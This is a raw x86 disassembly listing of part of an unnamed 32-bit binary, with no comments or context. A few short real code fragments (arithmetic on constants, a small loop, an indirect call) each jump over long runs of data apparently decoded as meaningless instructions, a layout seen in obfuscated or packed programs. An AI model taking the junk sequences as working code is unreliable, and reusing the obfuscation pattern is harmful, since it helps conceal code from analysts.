  405241:	lock aad 0x6a
  405244:	push   es
  405245:	pop    esi
  405246:	mov    ch,0xe9
  405248:	cmp    bl,0x1
  40524b:	out    0xc,eax
  40524d:	sbb    BYTE PTR [eax+0x2d],0x23
  405251:	(bad)  
  405252:	iret   
  405253:	test   BYTE PTR [eax],cl
  405255:	(bad)  
  405256:	mov    edx,0x42894b8d
  40525b:	pop    edi
  40525c:	add    ebp,DWORD PTR [ebp+0x15]
  40525f:	lock into 
  405261:	mov    eax,ds:0x549893c2
  405266:	out    0x3c,eax
  405268:	pop    esp
  405269:	and    eax,0x18ead128
  40526e:	jle    0x4052d0
  405270:	or     esp,DWORD PTR ds:0xa3f6e742
  405276:	xchg   ecx,eax
  405277:	mov    ds:0x4f503046,al
  40527c:	jae    0x405281
  40527e:	dec    dl
  405280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405281:	dec    eax
  405282:	out    0x3b,eax
  405284:	add    DWORD PTR [eax+0x27],ebx
  405287:	popa   
  405288:	dec    BYTE PTR [ebp+ecx*4+0x19a40e18]
  40528f:	adc    bl,BYTE PTR [eax+0x5a]
  405292:	add    dh,BYTE PTR ds:0x2ffae2f0
  405298:	mov    bl,0x7f
  40529a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40529b:	mov    ds,WORD PTR [edi-0xa0cfbaa]
  4052a1:	fcomip st,st(5)
  4052a3:	cmp    cl,bh
  4052a5:	mov    al,BYTE PTR [ebp-0x2b]
  4052a8:	sub    eax,0x40e08e52
  4052ad:	loop   0x4052d2
  4052af:	sub    BYTE PTR [ebx+0x7223ea34],bl
  4052b5:	(bad)  
  4052b6:	dec    edi
  4052b7:	sub    ebx,DWORD PTR [eax]
  4052b9:	jnp    0x405250
  4052bb:	pop    edi
  4052bc:	icebp  
  4052bd:	jmp    0x354b6869
  4052c2:	inc    ecx
  4052c3:	push   ds
  4052c4:	xchg   edx,eax
  4052c5:	xchg   esi,eax
  4052c6:	pop    ebp
  4052c7:	add    BYTE PTR [edx+0x2885fcbf],0x6c
  4052ce:	jmp    0x405297
  4052d0:	xor    esi,edx
  4052d2:	add    eax,ecx
  4052d4:	add    esi,ecx
  4052d6:	imul   eax,esi
  4052d9:	jmp    0x40559d
  4052de:	mov    eax,DWORD PTR [ebp+0xc]
  4052e1:	mov    eax,DWORD PTR [eax+0x78]
  4052e4:	mov    DWORD PTR [ebp+0xc],eax
  4052e7:	mov    eax,DWORD PTR [ebp-0x4]
  4052ea:	mov    esi,DWORD PTR [ebp-0x8]
  4052ed:	xor    eax,edx
  4052ef:	xor    esi,edx
  4052f1:	add    eax,ecx
  4052f3:	jmp    0x405577
  4052f8:	shl    DWORD PTR [ebx],0xe4
  4052fb:	add    al,0xe2
  4052fd:	ret    
  4052fe:	loope  0x4052e1
  405300:	and    esp,DWORD PTR [eax-0x3abdfef8]
  405306:	in     al,dx
  405307:	sbb    eax,esi
  405309:	sub    dh,BYTE PTR [eax+0x70]
  40530c:	fnstcw WORD PTR [esi+0x70]
  40530f:	jo     0x4052d8
  405311:	hlt    
  405312:	scas   eax,DWORD PTR es:[edi]
  405313:	dec    esp
  405314:	repz mov al,0x3c
  405317:	inc    edx
  405318:	mov    ecx,0x7d89415d
  40531d:	ja     0x4052c3
  40531f:	push   esp
  405320:	test   ah,0xb2
  405323:	mov    bl,0x70
  405325:	jbe    0x405334
  405327:	dec    edi
  405328:	les    ecx,FWORD PTR [ebx-0x4b]
  40532b:	lods   al,BYTE PTR ds:[esi]
  40532c:	jp     0x405350
  40532e:	jp     0x4052b7
  405330:	and    eax,0x7dff40d5
  405335:	xor    bl,BYTE PTR [ebx]
  405337:	hlt    
  405338:	pop    ecx
  405339:	mov    ch,0x8a
  40533b:	push   eax
  40533c:	pop    ss
  40533d:	xor    DWORD PTR [ebx],0xe16a0c9c
  405343:	sbb    ebp,eax
  405345:	fidivr WORD PTR [ebx+0x3972ce0b]
  40534b:	out    0x84,eax
  40534d:	jg     0x4053c3
  40534f:	push   esi
  405350:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405351:	(bad)  
  405352:	xlat   BYTE PTR ds:[ebx]
  405353:	adc    eax,0xdb399232
  405358:	retf   
  405359:	call   0xc741:0x135e03d8
  405360:	dec    edi
  405361:	lods   eax,DWORD PTR ds:[esi]
  405362:	mov    edx,0x55858f9b
  405367:	cmc    
  405368:	add    eax,0x682d9bf8
  40536d:	mov    cl,0x42
  40536f:	in     eax,dx
  405370:	arpl   WORD PTR [ecx-0xe20548c],bx
  405376:	sub    dh,BYTE PTR [esi+0x77]
  405379:	repz sbb eax,0xb86cd1c1
  40537f:	jnp    0x4053c4
  405381:	test   DWORD PTR [edx],ebp
  405383:	inc    ebx
  405384:	lea    esp,[esi+0x1c]
  405387:	cmp    ebp,DWORD PTR [ecx+0x2c32e72d]
  40538d:	inc    ebx
  40538e:	popa   
  40538f:	cmp    al,0x1b
  405391:	aam    0xee
  405393:	sbb    al,BYTE PTR [esi-0x4a]
  405396:	xchg   ebp,eax
  405397:	(bad)
  40539a:	imul   eax,DWORD PTR [edi+ebp*2+0x59cb9ae9],0xffffffcb
  4053a2:	jmp    0x35287de8
  4053a7:	scas   al,BYTE PTR es:[edi]
  4053a8:	in     eax,0x11
  4053aa:	jns    0x405361
  4053ac:	cmp    al,0xeb
  4053ae:	mov    ah,0xb2
  4053b0:	idiv   DWORD PTR ds:0x729527dd
  4053b6:	mov    ds:0x10024400,al
  4053bb:	jle    0x40540c
  4053bd:	cmp    al,cl
  4053bf:	xchg   edi,eax
  4053c0:	jmp    0x9f998409
  4053c5:	gs test al,0x43
  4053c8:	push   es
  4053c9:	scas   eax,DWORD PTR es:[edi]
  4053ca:	fwait
  4053cb:	sbb    cl,al
  4053cd:	sbb    BYTE PTR [ebp-0x6f3a28d9],al
  4053d3:	mov    eax,ds:0xb7303af6
  4053d8:	cmp    DWORD PTR [eax],eax
  4053da:	addr16 jl 0x405389
  4053dd:	stc    
  4053de:	xor    bl,BYTE PTR [ecx-0x77246ed7]
  4053e4:	(bad)  
  4053e5:	cli    
  4053e6:	and    ebx,DWORD PTR [ecx]
  4053e8:	or     cl,BYTE PTR [ecx]
  4053ea:	(bad)  
  4053eb:	mov    DWORD PTR [edx-0x19],esi
  4053ee:	xchg   edx,eax
  4053ef:	xchg   ecx,eax
  4053f0:	shr    DWORD PTR [ebp-0x1a],1
  4053f3:	sub    eax,0xace35cae
  4053f8:	xchg   ebp,eax
  4053f9:	push   edi
  4053fa:	adc    DWORD PTR [edx],esp
  4053fc:	dec    ebp
  4053fd:	sub    esi,ebx
  4053ff:	rcr    DWORD PTR [eax-0x1f],1
  405402:	or     BYTE PTR [edx],dl
  405404:	inc    ebx
  405405:	xchg   BYTE PTR [eax+0x3a],dh
  405408:	leave  
  405409:	ror    DWORD PTR [edi],0xf4
  40540c:	call   0xd6e5cd50
  405411:	aad    0x5e
  405413:	stos   BYTE PTR es:[edi],al
  405414:	lock jnp 0x40539d
  405417:	jle    0x405466
  405419:	out    0x72,al
  40541b:	add    eax,0xbf962ce4
  405420:	inc    ebx
  405421:	or     al,0xd8
  405423:	loope  0x405413
  405425:	iret   
  405426:	out    dx,eax
  405427:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405428:	sahf   
  405429:	mov    dh,0x2b
  40542b:	shl    BYTE PTR [edi-0x78],0x52
  40542f:	mov    cs,WORD PTR [edi+0x310b2729]
  405435:	and    eax,0x29a4a53b
  40543a:	seta   BYTE PTR [edi-0x1c]
  40543e:	in     al,dx
  40543f:	xor    al,0x70
  405441:	push   es
  405442:	ret    
  405443:	in     eax,dx
  405444:	pop    edx
  405445:	sbb    al,BYTE PTR [ebp+0x34]
  405448:	inc    edx
  405449:	fdiv   QWORD PTR [edi-0x17]
  40544c:	sbb    ch,BYTE PTR [esi+0x78]
  40544f:	jno    0x40541f
  405451:	add    DWORD PTR [eax-0x46],edi
  405454:	mov    edx,0x5c403038
  405459:	call   0xf5a8bc38
  40545e:	int    0x5f
  405460:	inc    eax
  405461:	adc    eax,ebp
  405463:	add    esi,esi
  405465:	mov    ch,0xc6
  405467:	add    al,0x57
  405469:	jmp    0x3692:0xd48d4973
  405470:	ss into 
  405472:	push   edi
  405473:	jae    0x4054b8
  405475:	scas   eax,DWORD PTR es:[edi]
  405476:	mov    ds,WORD PTR [ebx]
  405478:	addr16 mov ebx,0x886e5d79
  40547e:	mov    bh,0x4a
  405480:	rcl    DWORD PTR [esi+esi*4-0x6cfef974],cl
  405487:	ins    DWORD PTR es:[edi],dx
  405488:	ins    BYTE PTR es:[edi],dx
  405489:	mov    dh,0xff
  40548b:	xchg   edi,eax
  40548c:	push   edi
  40548d:	adc    BYTE PTR cs:[ebx-0x7c9071ab],ch
  405494:	pop    eax
  405495:	dec    ebp
  405496:	or     eax,0x998bf423
  40549b:	dec    eax
  40549c:	mov    ah,0x2c
  40549e:	das    
  40549f:	out    0xc0,al
  4054a1:	stos   DWORD PTR es:[edi],eax
  4054a2:	and    al,0xc0
  4054a4:	lods   eax,DWORD PTR ds:[esi]
  4054a5:	rol    DWORD PTR [ebp-0x3c41ace3],1
  4054ab:	inc    esi
  4054ac:	cmp    edi,DWORD PTR [edx-0x489c8920]
  4054b2:	pop    ebx
  4054b3:	adc    BYTE PTR [ebp+0x54683d90],bh
  4054b9:	inc    eax
  4054ba:	push   ecx
  4054bb:	imul   ecx,esp,0x7d8630f3
  4054c1:	adc    DWORD PTR ds:0x72577507,0x7daff694
  4054cb:	out    dx,eax
  4054cc:	jg     0x40548f
  4054ce:	pop    edx
  4054d0:	jo     0x4054f4
  4054d2:	pusha  
  4054d3:	mov    ch,0xe3
  4054d5:	sbb    DWORD PTR [eax],edi
  4054d7:	stos   DWORD PTR es:[edi],eax
  4054d8:	cmp    ecx,DWORD PTR [ebx+0x16]
  4054db:	adc    ch,cl
  4054dd:	out    0xa4,al
  4054df:	imul   bl
  4054e1:	clc    
  4054e2:	popf   
  4054e3:	fsub   st,st(5)
  4054e5:	pushf  
  4054e6:	call   0xfae7:0xee0a3fe6
  4054ed:	sub    al,0xe3
  4054ef:	sbb    ecx,ecx
  4054f1:	mov    ecx,0x7a94134d
  4054f6:	int3   
  4054f7:	ja     0x4054d4
  4054f9:	push   ebp
  4054fa:	ins    BYTE PTR es:[edi],dx
  4054fb:	icebp  
  4054fc:	add    edi,DWORD PTR [ecx-0x2e]
  4054ff:	adc    eax,0xa5992087
  405504:	mov    BYTE PTR [ecx+0x77],ch
  405507:	inc    edx
  405508:	fisub  WORD PTR [edi]
  40550a:	call   0x2753:0x15fa35f8
  405511:	fs das 
  405513:	adc    DWORD PTR [eax-0x6c],ebx
  405516:	push   ss
  405517:	mov    eax,0x93b81a58
  40551c:	test   al,0x71
  40551e:	cmp    al,0x57
  405520:	loop   0x4054bd
  405522:	push   cs
  405523:	(bad)  
  405524:	ins    DWORD PTR es:[edi],dx
  405525:	sub    bl,dl
  405527:	pop    edx
  405528:	xlat   BYTE PTR ds:[ebx]
  405529:	cmp    al,0x1
  40552b:	stc    
  40552c:	xor    eax,0x1d190d1d
  405531:	push   es
  405532:	cli    
  405533:	push   edx
  405534:	pop    ss
  405535:	mov    dl,0xde
  405537:	adc    esp,DWORD PTR [ebp-0x73]
  40553a:	pop    ecx
  40553b:	(bad)  
  40553c:	in     al,0x1
  40553e:	push   ebp
  40553f:	lds    eax,FWORD PTR [edi]
  405541:	xchg   esp,eax
  405542:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405544:	ror    BYTE PTR [ecx+0x20],0xb1
  405548:	sar    ecx,cl
  40554a:	sbb    al,0xb6
  40554c:	mov    ecx,0xf5bf654c
  405551:	push   ds
  405552:	dec    edx
  405553:	dec    eax
  405554:	bound  ebx,QWORD PTR [ebx-0x6345d62d]
  40555a:	xchg   edx,eax
  40555b:	hlt    
  40555c:	adc    DWORD PTR [edi],0x55
  40555f:	cmp    edx,DWORD PTR [edx]
  405561:	sbb    BYTE PTR [edx+eiz*1-0x69caf4be],0xc9
  405569:	(bad)  [eax+eax*2+0x2dec6a16]
  405570:	popf   
  405571:	sub    ch,BYTE PTR [esi-0x5c]
  405574:	push   0x33
  405576:	dec    ebx
  405577:	add    esi,ecx
  405579:	imul   eax,esi
  40557c:	mov    esi,DWORD PTR [ebp+0xc]
  40557f:	cmp    esi,eax
  405581:	mov    eax,DWORD PTR [ebp-0x4]
  405584:	je     0x405047
  40558a:	xor    eax,edx
  40558c:	add    eax,ecx
  40558e:	mov    ecx,DWORD PTR [ebp+0xc]
  405591:	imul   eax,ecx
  405594:	add    eax,DWORD PTR [ebp+0x8]
  405597:	mov    DWORD PTR [ebp+0xc],eax
  40559a:	mov    eax,DWORD PTR [ebp+0xc]
  40559d:	pop    esi
  40559e:	leave  
  40559f:	ret    0x8
  4055a2:	push   ebp
  4055a3:	mov    ebp,esp
  4055a5:	push   ecx
  4055a6:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4055ad:	mov    eax,DWORD PTR [ebp-0x4]
  4055b0:	mov    edx,DWORD PTR [ebp+0x10]
  4055b3:	mov    ecx,0x7510855
  4055b8:	adc    DWORD PTR ds:0x434321,0x21da
  4055c2:	xor    eax,ecx
  4055c4:	add    eax,0x32729c
  4055c9:	and    DWORD PTR ds:0x4325fc,0x2b83
  4055d3:	mov    DWORD PTR [edx],eax
  4055d5:	mov    eax,ds:0x434339
  4055da:	mov    edx,DWORD PTR ds:0x43435d
  4055e0:	sub    eax,edx
  4055e2:	xor    eax,DWORD PTR [eax+edx*1]
  4055e5:	mov    eax,DWORD PTR [ebp+0xc]
  4055e8:	dec    edx
  4055e9:	xor    eax,ecx
  4055eb:	dec    edx
  4055ec:	jmp    0x405755
  4055f1:	loope  0x4055fe
  4055f3:	xchg   edi,eax
  4055f4:	fdiv   DWORD PTR [ebp+0x64]
  4055f7:	jno    0x405602
  4055f9:	add    DWORD PTR [edi-0x74],0x25f1f784
  405600:	jnp    0x4055b1
  405602:	sub    BYTE PTR [eax+0x70],dh
  405605:	les    edi,FWORD PTR [edi+0x70]
  405608:	jo     0x405651
  40560a:	mov    ds,ecx
  40560c:	shl    BYTE PTR ds:[eax],0x51
  405610:	and    eax,0x5d4c9779
  405615:	adc    BYTE PTR [eax-0x5c076b5],0x4b
  40561c:	pop    esp
  40561d:	ds pop ecx
  40561f:	or     edx,DWORD PTR [edx+ecx*4+0x67]
  405623:	in     eax,0x7
  405625:	push   esi
  405626:	cmc    
  405627:	out    dx,al
  405628:	jns    0x40566d
  40562a:	mov    ecx,0xc71a1ab7
  40562f:	push   eax
  405630:	push   ebx
  405631:	xor    eax,0x4e079780
  405636:	add    dh,bl
  405638:	rcl    DWORD PTR [ecx+0x3a9abb58],cl
  40563e:	repnz lods eax,DWORD PTR ds:[esi]
  405640:	pop    edx
  405641:	mov    al,ds:0x40f281a3
  405646:	or     al,dl
  405648:	mov    al,0xfd
  40564a:	add    al,0x92
  40564c:	add    eax,0xf78d1191
  405651:	cld    
  405652:	add    eax,0x9798c9a6
  405657:	sbb    al,0xaf
  405659:	test   BYTE PTR [eax],0x30
  40565c:	outs   dx,DWORD PTR ds:[esi]
  40565d:	in     eax,0x69
  40565f:	imul   edx,eax,0x7b
  405662:	push   ebp
  405663:	or     BYTE PTR [ecx+0x3075f037],0x9a
  40566a:	pushf  
  40566b:	mov    edx,0xb11ec3e4
  405670:	mov    ebx,0x36f33fac
  405675:	fdiv   QWORD PTR [esi-0x73794591]
  40567b:	ss jo  0x405653
  40567e:	inc    BYTE PTR [edi]
  405680:	ret    0x53c2
  405683:	lahf   
  405684:	nop
  405685:	loope  0x4056af
  405687:	pop    es
  405688:	jp     0x4056e6
  40568a:	lds    edi,FWORD PTR [eax*2+0x5219bab3]
  405691:	ins    BYTE PTR es:[edi],dx
  405692:	cmp    edx,DWORD PTR [esi]
  405694:	rol    DWORD PTR [edi+0x5522e4af],cl
  40569a:	cmp    DWORD PTR [edi+0x66],ebx
  40569d:	mov    ah,0x57
  40569f:	dec    eax
  4056a0:	mov    edi,0x397eb7d4
  4056a5:	jnp    0x4056b4
  4056a7:	sbb    bl,dl
  4056a9:	sahf   
  4056aa:	int3   
  4056ab:	pop    ebx
  4056ac:	mov    ebp,0xa1b666d9
  4056b1:	out    0x56,eax
  4056b3:	aas    
  4056b4:	cld    
  4056b5:	or     esi,esp
  4056b7:	div    BYTE PTR [edi+eiz*2-0x2d]
  4056bb:	mov    bh,bh
  4056bd:	test   eax,0xe8483ec9
  4056c2:	lahf   
  4056c3:	rcl    DWORD PTR [edi-0x43583225],0x98
  4056ca:	sahf   
  4056cb:	and    al,0x4
  4056cd:	mov    ch,BYTE PTR [edi+0x2ee1295c]
  4056d3:	lds    eax,FWORD PTR [ebp+0x713d171a]
  4056d9:	mov    DWORD PTR [esi+0x5b],ecx
  4056dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056dd:	addr16 shr esp,cl
  4056e0:	inc    eax
  4056e1:	sbb    ah,al
  4056e3:	xchg   ecx,eax
  4056e4:	cmpps  xmm2,XMMWORD PTR [eax],0x58
  4056e8:	inc    ebx
  4056e9:	jg     0x405746
  4056eb:	iret   
  4056ec:	dec    eax
  4056ed:	shl    ah,1
  4056ef:	and    BYTE PTR [edi+eiz*8],cl
  4056f2:	(bad)  
  4056f3:	mov    ch,0x37
  4056f5:	lods   eax,DWORD PTR ds:[esi]
  4056f6:	imul   ebp,DWORD PTR [ecx+0x3d5454a3],0x24db6fa9
  405700:	mov    ds:0xc23cf394,eax
  405705:	lock hlt 
  405707:	push   esp
  405708:	and    edi,eax
  40570a:	adc    cl,BYTE PTR [esi+eax*1+0x45737c29]
  405711:	and    eax,0xda708fe3
  405716:	sub    esp,DWORD PTR [ebx+0x6c51334d]
  40571c:	(bad)  
  40571d:	pop    esp
  40571e:	jl     0x4056fd
  405720:	mov    fs,WORD PTR [edx-0x2]
  405723:	mov    eax,ds:0xda2c35f9
  405728:	mov    ch,0xd3
  40572a:	lods   eax,DWORD PTR ds:[esi]
  40572b:	and    al,0xdc
  40572d:	mov    ebp,0x23571ce3
  405732:	jg     0x40575b
  405734:	mov    al,0x35
  405736:	xchg   edi,eax
  405737:	xor    ebp,DWORD PTR [edi+edx*1-0x339fc823]
  40573e:	jno    0x405726
  405740:	xchg   ebx,eax
  405741:	jl     0x4057a1
  405743:	stos   DWORD PTR es:[edi],eax
  405744:	cmc    
  405745:	pop    esp
  405746:	or     BYTE PTR [ebp+edx*2-0x6980a779],ah
  40574d:	paddusb mm6,mm5
  405750:	ins    BYTE PTR es:[edi],dx
  405751:	aas    
  405752:	mov    edi,0x8b56d0c6
  405757:	jne    0x405769
  405759:	and    DWORD PTR ds:0x43426a,0x0
  405763:	mov    edx,DWORD PTR ds:0x43426a
  405769:	inc    edx
  40576a:	mov    DWORD PTR ds:0x43426a,edx
  405770:	cmp    DWORD PTR ds:0x43426a,0x22
  405777:	jne    0x405789
  40577d:	push   DWORD PTR [ebp-0xc]
  405780:	push   DWORD PTR [ebp-0x24]
  405783:	call   DWORD PTR ds:0x4328c2
  405789:	cmp    DWORD PTR ds:0x43426a,0x1c
  405790:	jb     0x405763
  405796:	mov    edx,0x32729c
  40579b:	adc    DWORD PTR ds:0x432cbe,0x43428a
  4057a5:	add    eax,edx
  4057a7:	mov    DWORD PTR [esi+0x4],eax
  4057aa:	movzx  eax,BYTE PTR ds:0x4325f4
  4057b1:	and    eax,DWORD PTR ds:0x43429a
  4057b7:	mov    ds:0x4325f4,eax
  4057bc:	mov    eax,DWORD PTR [ebp+0x14]
  4057bf:	mov    DWORD PTR ds:0x43427e,0x718d
  4057c9:	mov    esi,DWORD PTR [ebp+0x10]
  4057cc:	xor    DWORD PTR ds:0x432604,0x2330
  4057d6:	mov    DWORD PTR [esi+0x8],eax
  4057d9:	mov    eax,DWORD PTR [ebp+0x18]
  4057dc:	mov    esi,DWORD PTR [ebp+0x10]
  4057df:	mov    DWORD PTR [esi+0xc],eax
  4057e2:	mov    eax,DWORD PTR [ebp+0x1c]
  4057e5:	mov    esi,DWORD PTR [ebp+0x10]
  4057e8:	mov    DWORD PTR [esi+0x10],eax
  4057eb:	mov    eax,eax
  4057ed:	jmp    0x405956
  4057f2:	hlt    
  4057f3:	and    BYTE PTR [ecx],bl
  4057f5:	arpl   cx,sp
  4057f7:	jno    0x40586b
  4057f9:	scas   eax,DWORD PTR es:[edi]
  4057fa:	mov    al,ds:0xfb519e0f
  4057ff:	mov    BYTE PTR [esi+0x7b],cl
  405802:	jae    0x40583b
  405804:	jo     0x405876
  405806:	les    edi,FWORD PTR [edi+0x70]
  405809:	jo     0x405853
  40580b:	xor    BYTE PTR [ecx+0x1b4a7013],dl
  405811:	jbe    0x405878
  405813:	call   0x3cf3:0xf6f9e0a9
  40581a:	push   edx
  40581b:	add    esp,edi
  40581d:	fs jb  0x40583d
  405820:	xor    DWORD PTR [eax+0x2371a861],eax
  405826:	push   ds
  405827:	cs cmp al,0xe
  40582a:	out    0x68,eax
  40582c:	pop    esp
  40582d:	push   ebx
  40582e:	int3   
  40582f:	push   ss
  405830:	xor    esi,esi
  405832:	ror    DWORD PTR [ebx-0x69e48ccf],0x5e
  405839:	sbb    bl,cl
  40583b:	sbb    al,0xed
  40583d:	mov    ah,0xde
  40583f:	add    cl,cl
  405841:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405842:	sar    BYTE PTR [edx+edi*2-0x172dff12],cl
  405849:	es push ebx
  40584b:	mov    bh,0xa2
  40584d:	sub    BYTE PTR [edx-0x6e836571],al
  405853:	dec    esp
  405854:	lds    edx,FWORD PTR [edx+0x37e82792]
  40585a:	in     eax,dx
  40585b:	xchg   ecx,eax
  40585c:	push   edx
  40585d:	ret    0xac5f
  405860:	je     0x4058a3
  405862:	popf   
  405863:	lock stos DWORD PTR es:[edi],eax
  405865:	adc    eax,DWORD PTR [ebx-0x22]
  405868:	fisttp WORD PTR [ebx+0x66]
  40586b:	dec    ecx
  40586c:	int3   
  40586d:	ds push es
  40586f:	jg     0x40581f
  405871:	retf   0xc358
  405874:	lods   eax,DWORD PTR ds:[esi]
  405875:	push   ecx
  405876:	cmp    ah,al
  405878:	pusha  
  405879:	jae    0x405831
  40587b:	push   esp
  40587c:	sahf   
  40587d:	in     al,dx
  40587e:	not    BYTE PTR [edx-0x79064bbd]
  405884:	push   ebx
  405885:	and    BYTE PTR [ecx-0x66],dl
  405888:	lods   al,BYTE PTR ds:[esi]
  405889:	loopne 0x40582d
  40588b:	or     ecx,DWORD PTR ds:0x6adcdf1b
  405891:	scas   eax,DWORD PTR es:[edi]
  405892:	or     eax,0x35de0707
  405897:	add    DWORD PTR [eax-0x2bad5bf5],0xc9045056
  4058a1:	fcmovb st,st(6)
  4058a3:	sub    esp,ecx
  4058a5:	cli    
  4058a6:	jp     0x40587a
  4058a8:	shr    DWORD PTR [edi],1
  4058aa:	xchg   ebp,ecx
  4058ac:	in     al,0xe2
  4058ae:	addr16 out 0x91,eax
  4058b1:	inc    ebx
  4058b2:	pop    ds
  4058b3:	jns    0x40584b
  4058b5:	rol    DWORD PTR [eax+eiz*1],0xe3
  4058b9:	stos   BYTE PTR es:[edi],al
  4058ba:	add    ecx,DWORD PTR [eax+0x29]
  4058bd:	or     al,0xd6
  4058bf:	cwde   
  4058c0:	in     eax,dx
  4058c1:	pushf  
  4058c2:	gs mov cl,0xc9
  4058c5:	and    al,0x9
  4058c7:	pop    eax
  4058c8:	xchg   BYTE PTR [edx],dh
  4058ca:	out    dx,eax
  4058cb:	sub    eax,0xd606f81c
  4058d0:	pop    eax
  4058d1:	adc    edx,DWORD PTR [ebx+0x6]
  4058d4:	(bad)  
  4058d5:	jbe    0x4058cc
  4058d7:	cmp    BYTE PTR [edx+edi*4+0x48],bh
  4058db:	popf   
  4058dc:	adc    edi,DWORD PTR [ecx+0x673212dd]
  4058e2:	imul   esi,DWORD PTR [edi+0x42609ad3],0xffffffb2
  4058e9:	test   DWORD PTR [edx],eax
  4058eb:	sub    al,BYTE PTR [ebx-0x6e]
  4058ee:	jae    0x40591e
  4058f0:	lahf   
  4058f1:	inc    eax
  4058f2:	mov    cl,0x24
  4058f4:	(bad)  
  4058f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058f6:	(bad)  
  4058f8:	add    edx,DWORD PTR [edi-0x66]
  4058fb:	loopne 0x4058c0
  4058fd:	fs cwde 
  4058ff:	ret    
  405900:	out    dx,al
  405901:	jmp    0x40596c
  405903:	in     al,0x2d
  405905:	pop    ebp
  405906:	mov    cl,BYTE PTR [eax-0x42]
  405909:	dec    esi
  40590a:	aam    0x10
  40590c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40590d:	ss (bad) 
  40590f:	aad    0x78
  405911:	dec    ecx
  405912:	repz pop edi
  405914:	lock cdq 
  405916:	mov    BYTE PTR [ebp+0x34c1e61e],bl
  40591c:	daa    
  40591d:	div    esi
  40591f:	mov    BYTE PTR [eax+0x4e679656],dl
  405925:	cmp    eax,DWORD PTR [ecx+esi*4]
  405928:	xor    ebx,DWORD PTR [edx-0x63e6c15a]
  40592e:	ret    
  40592f:	call   0xe3d824a5
  405934:	cmp    ch,BYTE PTR [edx+0x1bfd877]
  40593a:	pop    edi
  40593b:	das    
  40593c:	xor    eax,0x2032cb2
  405941:	mov    ebp,0xfc77831f
  405946:	xor    al,0x5f
  405948:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405949:	xchg   ecx,eax
  40594a:	and    DWORD PTR [esi-0x4],edi
  40594d:	aaa    
  40594e:	and    BYTE PTR [edi-0x1b8c601b],0xd6
  405955:	loop   0x4058e2
  405957:	inc    ebp
  405958:	or     BYTE PTR [ebx],dh
  40595a:	rol    DWORD PTR [ebx],0xc2
  40595d:	pop    esi
  40595e:	leave  
  40595f:	ret    0x18
  405962:	push   ebp
  405963:	mov    ebp,esp
  405965:	mov    eax,DWORD PTR [ebp+0xc]
  405968:	xor    edx,edx
  40596a:	jmp    0x405ad3
  40596f:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  405971:	sub    esi,DWORD PTR [esi+0x7161b2eb]
  405977:	mov    ah,0xc8
  405979:	mov    esi,0x90337a11
  40597e:	cmp    bh,al
  405980:	xor    eax,0x7fc47070
  405985:	jo     0x4059f7
  405987:	popf   
  405988:	xchg   edi,eax
  405989:	ins    DWORD PTR es:[edi],dx
  40598a:	rcl    BYTE PTR [edi],cl
  40598c:	and    ebx,DWORD PTR [edi]
  40598e:	mov    edx,0xbcfb7ff4
  405993:	adc    bl,bl
  405995:	inc    ebx
  405996:	jg     0x4059b0
  405998:	and    BYTE PTR [ecx+0x55],0xeb
  40599c:	and    eax,0xd5b771c2
  4059a1:	popa   
  4059a2:	pop    edi
  4059a3:	out    dx,al
  4059a4:	es and dl,ch
  4059a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059a8:	cld    
  4059a9:	mov    ds:0x2ef68f8f,al
  4059af:	clc    
  4059b0:	ins    BYTE PTR es:[edi],dx
  4059b1:	test   al,0xc3
  4059b3:	test   eax,0x26f23c01
  4059b8:	jnp    0x4059bd
  4059ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059bb:	push   dx
  4059bd:	pop    eax
  4059be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059bf:	lds    esi,FWORD PTR [ecx+0x16]
  4059c2:	mov    eax,0x4fbc82e9
  4059c7:	cs js  0x405a08
  4059ca:	xchg   edx,eax
  4059cb:	jp     0x4059eb
  4059cd:	mov    bh,0x51
  4059cf:	adc    DWORD PTR [ecx-0xfd4042f],ebp
  4059d5:	lods   al,BYTE PTR ds:[esi]
  4059d6:	mov    dh,0xed
  4059d8:	mov    al,0xd5
  4059da:	pop    ebx
  4059db:	adc    eax,0x890e3df4
  4059e0:	xchg   ebp,eax
  4059e1:	out    0x4e,eax
  4059e3:	mov    al,gs:0x7728c5a0
  4059e9:	inc    esi
  4059ea:	cmp    BYTE PTR [ecx+eiz*1-0x35],cl
  4059ee:	mov    ss,WORD PTR ds:0x2d20ded3
  4059f4:	mov    dl,0x11
  4059f6:	and    BYTE PTR [esi+0x470b9eaa],ah
  4059fc:	lock out 0xc3,eax
  4059ff:	mov    esi,0xd3a59646
  405a04:	retf   
  405a05:	scas   al,BYTE PTR es:[edi]
  405a06:	and    ch,BYTE PTR [eax]
  405a08:	test   BYTE PTR gs:[eax],dh
  405a0b:	mov    dl,0x9a
  405a0d:	shl    BYTE PTR [ebp+0x70],0x80
  405a11:	push   edi
  405a12:	xchg   esp,eax
  405a13:	or     edi,ebp
  405a15:	cmp    dl,ah
  405a17:	fsub   QWORD PTR [esi-0x5e5c157f]
  405a1d:	inc    eax
  405a1e:	pop    edx
  405a1f:	fiadd  WORD PTR [ecx-0x7b]
  405a22:	jns    0x4059b9
  405a24:	retf   
  405a25:	(bad)  
  405a26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a27:	cdq    
  405a28:	popf   
  405a29:	out    dx,al
  405a2a:	int3   
  405a2b:	mov    ecx,0xeb970b94
  405a30:	push   cs
  405a31:	(bad)  
  405a32:	mov    ch,0xa9
  405a34:	ins    BYTE PTR es:[edi],dx
  405a35:	out    dx,al
  405a36:	dec    edi
  405a37:	adc    bh,ah
  405a39:	sbb    BYTE PTR [eax+eax*2],cl
  405a3c:	xchg   esp,eax
  405a3d:	lods   al,BYTE PTR ds:[esi]
  405a3e:	psrld  mm0,QWORD PTR [edx-0x19]
  405a42:	xchg   edi,eax
  405a43:	fstp   QWORD PTR [eax]
